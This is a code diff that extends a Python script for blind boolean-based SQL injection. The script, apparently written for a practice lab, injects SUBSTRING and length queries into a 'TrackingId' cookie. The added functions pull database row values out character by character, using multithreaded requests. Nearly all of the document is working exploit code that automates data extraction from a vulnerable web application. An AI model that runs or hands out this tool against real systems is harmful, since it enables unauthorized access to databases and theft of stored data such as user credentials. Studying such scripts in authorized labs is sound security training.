@@ -163,6 +163,36 @@ def num_of_table_rows(query_table):
 			return table_row_count
 			break
 
+def length_of_row_value(iterator, query_table, column_name):
+	for value_char_length in list(range(1,400)):
+
+		query = f"' AND (select length({column_name}) from {query_table} limit 1 offset {iterator})='{value_char_length}"
+		cookies = {
+		"session":session.cookies['session'],
+		"TrackingId":f"{session.cookies['TrackingId']}{query}"
+		}
+
+		response = requests.get(rhost,cookies=cookies,verify=False)
+
+		if pattern_string in response.text:
+			return value_char_length
+			break
+
+def enum_row_values(num_of_table_rows, query_table, column_name, index):
+	for printableCharacter in string.printable:
+		query = f"' AND ((SELECT SUBSTRING({column_name},{index},1) from {query_table}) limit 1 offset {num_of_table_rows})='{printableCharacter}"
+		cookies = {
+		"session":session.cookies['session'],
+		"TrackingId":f"{session.cookies['TrackingId']}{query}"
+		}
+
+		response = requests.get(rhost,cookies=cookies,verify=False)
+
+		if pattern_string in response.text:
+			print(f"{printableCharacter}")
+			return str(printableCharacter)
+			break
+
 
 if __name__ == "__main__":
 	# 1. Grab the tracking ID cookie from establishing a session.
@@ -205,7 +235,7 @@ if __name__ == "__main__":
 
 # Find numebr of rows in the tables
 	table_row_count = num_of_table_rows(query_table)
-	print(f"{query_table} has {table_row_count} rows.")
+	print(f"Table '{query_table}' has {table_row_count} rows.")
 
 # Find the character length of each column in the table name user parameter.	## Outside loop on the number of tables in the current database.
 # Find the name of each column in the table name user paramter.
@@ -224,6 +254,24 @@ if __name__ == "__main__":
 			column_name += letter
 		print(f"Table {query_table} column number {iterator+1} name is {column_name}")
 
+
+	query_column = input("Enter column to enumerate: ")
+
+# def enum_row_values(num_of_table_rows, query_table, column_name, index):
+	for iterator in range(0,table_row_count):
+		## Find the character length of the table being looped on.
+		value_char_length = length_of_row_value(iterator, query_table, query_column)
+		## Display the character length of the table number being looped on.
+		print(f"Table {query_table} column {query_column} row #{iterator+1} character length is {value_char_length}")
+		## Find the name of the table being looped on by using the lenght of the table and the iterator as inputs.
+		with concurrent.futures.ThreadPoolExecutor() as executor:
+			## Note this is how you pass two agruments to a function in this map call: iterator surrounded by repeat and the number of times to perform the operation dicted by the table_char_length value + 1.
+			row_value_letters = executor.map(enum_row_values, repeat(iterator), repeat(query_table), repeat(query_column), list(range(1,value_char_length+1)))
+		## Dipslay the name of the table being looped.
+		row_value_name = ''
+		for letter in row_value_letters:
+			row_value_name += letter
+		print(f"Table {query_table} column {query_column} row #{iterator+1} value is {row_value_name}")
 
 
 # Find the values of the user defined column and table.
